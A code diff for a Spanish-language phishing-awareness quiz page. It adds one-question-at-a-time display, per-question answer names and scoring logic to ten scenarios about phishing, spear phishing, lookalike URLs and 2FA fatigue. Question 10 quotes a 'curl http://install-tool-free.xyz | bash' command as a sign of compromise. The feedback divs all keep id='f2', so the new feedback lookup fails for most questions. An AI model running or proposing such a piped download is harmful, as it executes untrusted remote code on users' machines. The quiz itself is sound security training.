@@ -45,6 +45,11 @@ h1 {
 
 .question {
     margin-bottom: 25px;
+    display: none;
+}
+
+.question.active{
+    display: block;
 }
 
 .question h3 {
@@ -104,7 +109,7 @@ button {
 <form id="quizForm">
 
 <!-- Pregunta 1 -->
-<div class="question">
+<div class="question active" id="q1">
 <h3>1. Correo sospechoso de Microsoft</h3>
 <p>Recibes un correo de “seguridad” de Microsoft indicando que alguien inició sesión desde otro país.
 El correo incluye:
@@ -121,7 +126,7 @@ Página que abre: idéntica al login real, pero la URL es login-microsoft.secure
 </div>
 
 <!-- Pregunta 2 -->
-<div class="question">
+<div class="question" id="q2">
 <h3>2. App con permisos Google</h3>
 <p>Recibes una notificación para autorizar una app llamada “Docs Viewer Pro” que solicita acceso a tu cuenta de Google.
 No pide contraseña, solo permisos (leer correos, contactos, drive).</p>
@@ -134,22 +139,22 @@ No pide contraseña, solo permisos (leer correos, contactos, drive).</p>
 </div>
 
 <!-- Pregunta 3 -->
-<div class="question">
+<div class="question" id="q3">
 <h3>3. Mensaje en Discord con archivo</h3>
 <p>Un usuario en Discord te envía:
 “Bro, mira este proyecto que hicimos en clase 👀” + archivo project_build.zip
 
 Dentro hay un .exe con icono de PDF.</p>
 <h3>¿Qué tipo de ataque es más probable?</h3>
-<label><input type="radio" name="q2" value="A"> Phishing Clasico</label>
-<label><input type="radio" name="q2" value="B"> Ingenieria Social + malware</label>
-<label><input type="radio" name="q2" value="C"> Spam inofensivo</label>
-<label><input type="radio" name="q2" value="D"> Publicidad </label>
+<label><input type="radio" name="q3" value="A"> Phishing Clasico</label>
+<label><input type="radio" name="q3" value="B"> Ingenieria Social + malware</label>
+<label><input type="radio" name="q3" value="C"> Spam inofensivo</label>
+<label><input type="radio" name="q3" value="D"> Publicidad </label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 4 -->
-<div class="question">
+<div class="question" id="q4">
 <h3>4. Pagina con certificados validos</h3>
 <p>Entras a una página de “Netflix gratis por estudiantes”.
 
@@ -158,30 +163,30 @@ Tiene candado (SSL válido)
 Pide tarjeta “para verificación”</p>
 
 <h3>¿Qué conclusión es correcta?</h3>
-<label><input type="radio" name="q2" value="A"> Es segura por tener HTTPS</label>
-<label><input type="radio" name="q2" value="B"> Es phishing, el SSL no garantiza legitimidad</label>
-<label><input type="radio" name="q2" value="C"> Es una promocion valida</label>
-<label><input type="radio" name="q2" value="D"> Es un error de navegador</label>
+<label><input type="radio" name="q4" value="A"> Es segura por tener HTTPS</label>
+<label><input type="radio" name="q4" value="B"> Es phishing, el SSL no garantiza legitimidad</label>
+<label><input type="radio" name="q4" value="C"> Es una promocion valida</label>
+<label><input type="radio" name="q4" value="D"> Es un error de navegador</label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 5 -->
-<div class="question">
+<div class="question" id="q5">
 <h3>5. Mensaje por redes sociales</h3>
 <p>En Instagram, una cuenta con fotos reales y seguidores te escribe:
 “Hola, estoy participando en un concurso de fotografía, ¿puedes votar por mí? Solo inicia sesión aquí 👉 [link]”
 
 El sitio clona Instagram.</p>
 <h3>¿Qué lo hace más peligroso?</h3>
-<label><input type="radio" name="q2" value="A"> Tiene pocos seguidores</label>
-<label><input type="radio" name="q2" value="B"> Usa ingenieria social basada en confianza </label>
-<label><input type="radio" name="q2" value="C"> Es un mensaje largo</label>
-<label><input type="radio" name="q2" value="D"> Tiene emojis </label>
+<label><input type="radio" name="q5" value="A"> Tiene pocos seguidores</label>
+<label><input type="radio" name="q5" value="B"> Usa ingenieria social basada en confianza </label>
+<label><input type="radio" name="q5" value="C"> Es un mensaje largo</label>
+<label><input type="radio" name="q5" value="D"> Tiene emojis </label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 6 -->
-<div class="question">
+<div class="question" id="q6">
 <h3>6. Correo academico</h3>
 <p>Recibes un correo aparentemente de tu universidad:
 
@@ -189,63 +194,63 @@ Usa tu nombre completo
 Menciona una materia real
 Adjunta un link a “material exclusivo” alojado en drive-university-files.com</p>
 <h3>¿Qué tipo de ataque es?</h3>
-<label><input type="radio" name="q2" value="A"> Phishing generico</label>
-<label><input type="radio" name="q2" value="B"> Spear phishing </label>
-<label><input type="radio" name="q2" value="C"> Spam</label>
-<label><input type="radio" name="q2" value="D"> Malware automatico </label>
+<label><input type="radio" name="q6" value="A"> Phishing generico</label>
+<label><input type="radio" name="q6" value="B"> Spear phishing </label>
+<label><input type="radio" name="q6" value="C"> Spam</label>
+<label><input type="radio" name="q6" value="D"> Malware automatico </label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 7 -->
-<div class="question">
+<div class="question" id="q7">
 <h3>URL sospechosa</h3>
 <p>Te llega este enlace:
 https://paypal.com.security-update-user.info/login</p>
 <h3>¿Qué indica que es malicioso?</h3>
-<label><input type="radio" name="q2" value="A"> Tiene "paypal.com"</label>
-<label><input type="radio" name="q2" value="B"> El dominio real es diferente </label>
-<label><input type="radio" name="q2" value="C"> Usa HTTPS</label>
-<label><input type="radio" name="q2" value="D"> Tiene "login" en el link </label>
+<label><input type="radio" name="q7" value="A"> Tiene "paypal.com"</label>
+<label><input type="radio" name="q7" value="B"> El dominio real es diferente </label>
+<label><input type="radio" name="q7" value="C"> Usa HTTPS</label>
+<label><input type="radio" name="q7" value="D"> Tiene "login" en el link </label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 8 -->
-<div class="question">
+<div class="question" id="q8">
 <h3>8. Codigo QR</h3>
 <p>En una cafetería ves un QR para “WiFi gratis”.
 Te lleva a una página que pide iniciar sesión con Facebook.</p>
 <h3>¿Cuál es el riesgo?</h3>
-<label><input type="radio" name="q2" value="A"> Ninguno, es WiFi</label>
-<label><input type="radio" name="q2" value="B"> Robo de informacion</label>
-<label><input type="radio" name="q2" value="C"> Solo es publicidad</label>
-<label><input type="radio" name="q2" value="D"> Es obligatorio </label>
+<label><input type="radio" name="q8" value="A"> Ninguno, es WiFi</label>
+<label><input type="radio" name="q8" value="B"> Robo de informacion</label>
+<label><input type="radio" name="q8" value="C"> Solo es publicidad</label>
+<label><input type="radio" name="q8" value="D"> Es obligatorio </label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 9 -->
-<div class="question">
+<div class="question" id="q9">
 <h3>9. Supuesto ataque a tu correo </h3>
 <p>Recibes múltiples solicitudes de autenticación en tu app (2FA) sin haber iniciado sesión. Luego te llega un mensaje:
 “Soy soporte, aprueba la notificación para detener el ataque”</p>
 <h3>¿Qué técnica es?</h3>
-<label><input type="radio" name="q2" value="A"> Phishing</label>
-<label><input type="radio" name="q2" value="B"> Fatiga de 2FA </label>
-<label><input type="radio" name="q2" value="C"> DDoS</label>
-<label><input type="radio" name="q2" value="D"> Fuerza Bruta</label>
+<label><input type="radio" name="q9" value="A"> Phishing</label>
+<label><input type="radio" name="q9" value="B"> Fatiga de 2FA </label>
+<label><input type="radio" name="q9" value="C"> DDoS</label>
+<label><input type="radio" name="q9" value="D"> Fuerza Bruta</label>
 <div class="feedback" id="f2"></div>
 </div>
 
 <!-- Pregunta 2 -->
-<div class="question">
+<div class="question" id="q10">
 <h3>10. Repositorio en GitHub</h3>
 <p>Buscas una herramienta y encuentras un repositorio en GitHub con muchas estrellas falsas.
 El README te pide ejecutar:
 curl http://install-tool-free.xyz | bash</p>
 <h3>¿Qué indica compromiso?</h3>
-<label><input type="radio" name="q2" value="A"> Uso de bash</label>
-<label><input type="radio" name="q2" value="B"> Descarga desde fuente no confiable </label>
-<label><input type="radio" name="q2" value="C"> Tiene muchas estrellas</label>
-<label><input type="radio" name="q2" value="D"> Es open source</label>
+<label><input type="radio" name="q10" value="A"> Uso de bash</label>
+<label><input type="radio" name="q10" value="B"> Descarga desde fuente no confiable </label>
+<label><input type="radio" name="q10" value="C"> Tiene muchas estrellas</label>
+<label><input type="radio" name="q10" value="D"> Es open source</label>
 <div class="feedback" id="f2"></div>
 </div>
 
@@ -311,6 +316,54 @@ function actualizarProgreso() {
 document.querySelectorAll("input").forEach(input => {
     input.addEventListener("change", actualizarProgreso);
 });
+
+let preguntaActual = 1;
+let totalPreguntas = 10;
+let puntaje = 0;
+
+
+// Detectar respuesta
+document.querySelectorAll("input").forEach(input => {
+    input.addEventListener("change", function() {
+
+        let nombre = this.name;
+        let valor = this.value;
+
+        let feedback = document.getElementById("f" + nombre.slice(1));
+
+        if (valor === respuestas[nombre].correcta) {
+            puntaje++;
+            feedback.className = "feedback correct";
+            feedback.innerHTML = "✅ Correcto: " + respuestas[nombre].explicacion;
+        } else {
+            feedback.className = "feedback incorrect";
+            feedback.innerHTML = "❌ Incorrecto: " + respuestas[nombre].explicacion;
+        }
+
+        feedback.style.display = "block";
+
+        // Actualizar barra
+        let progreso = (preguntaActual / totalPreguntas) * 100;
+        document.getElementById("progress").style.width = progreso + "%";
+
+        // Avanzar después de 2 segundos
+        setTimeout(() => {
+            siguientePregunta();
+        }, 2000);
+    });
+});
+
+function siguientePregunta() {
+    document.getElementById("q" + preguntaActual).classList.remove("active");
+
+    preguntaActual++;
+
+    if (preguntaActual <= totalPreguntas) {
+        document.getElementById("q" + preguntaActual).classList.add("active");
+    } else {
+        mostrarResultado();
+    }
+}
 
 function calificar() {
     let puntaje = 0;
